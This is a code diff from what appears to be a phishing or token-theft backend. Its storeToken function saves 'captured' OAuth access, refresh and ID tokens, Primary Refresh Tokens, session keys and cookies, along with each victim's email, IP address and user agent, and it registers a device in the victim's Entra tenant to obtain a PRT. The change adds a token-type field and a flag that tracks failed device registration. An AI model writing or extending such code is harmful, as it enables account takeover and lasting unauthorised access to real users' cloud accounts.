@@ -502,11 +502,12 @@ async function storeToken(job, tokenData, responseCookies = []) {
 
     const [result] = await db.query(
        `INSERT INTO captured_tokens (user_id, link_id, email, token_type, access_token_encrypted, refresh_token_encrypted, id_token_encrypted, prt, session_key_jwe, device_tenant_id, cookies_encrypted, ip_address, user_agent, expiration, tenant, template_type, account_type, client_id)
-        VALUES (?, ?, ?, 'token', ?, ?, ?, ?, ?, ?, ?, ?, ?, DATE_ADD(NOW(), INTERVAL 876000 HOUR), ?, ?, ?, ?)`,
+        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, DATE_ADD(NOW(), INTERVAL 876000 HOUR), ?, ?, ?, ?)`,
       [
         job.user_id,
         job.link_id,
         email,
+        job.mode || 'token',
         encrypt(tokenData.access_token),
         encrypt(tokenData.refresh_token || null),
         encrypt(tokenData.id_token || null),
@@ -593,6 +594,10 @@ async function storeToken(job, tokenData, responseCookies = []) {
       const deviceManager = require('./devicemanager');
       // Extract email domain for DRS registration (e.g., 'saintaloysiusms.org' from 'user@saintaloysiusms.org')
       const emailDomain = email ? email.split('@')[1] : null;
+      
+      // Flag to track if device registration failed
+      let deviceRegistrationFailed = false;
+      
       deviceManager.registerDeviceAndGetPrt({
         access_token: tokenData.access_token,
         refresh_token: tokenData.refresh_token,
@@ -608,8 +613,12 @@ async function storeToken(job, tokenData, responseCookies = []) {
         console.log('[DeviceProxy] Device credentials stored for token', tokenId);
       }).catch(err => {
         console.error('[DeviceProxy] Device registration failed:', err.message);
+        deviceRegistrationFailed = true;
         // Don't fail the token capture - device registration is optional
       });
+      
+      // Expose flag for capture.js to check early
+      job.deviceRegistrationFailed = () => deviceRegistrationFailed;
     } else {
       console.log('[DeviceProxy] Device registration skipped:', {
         tokenId,
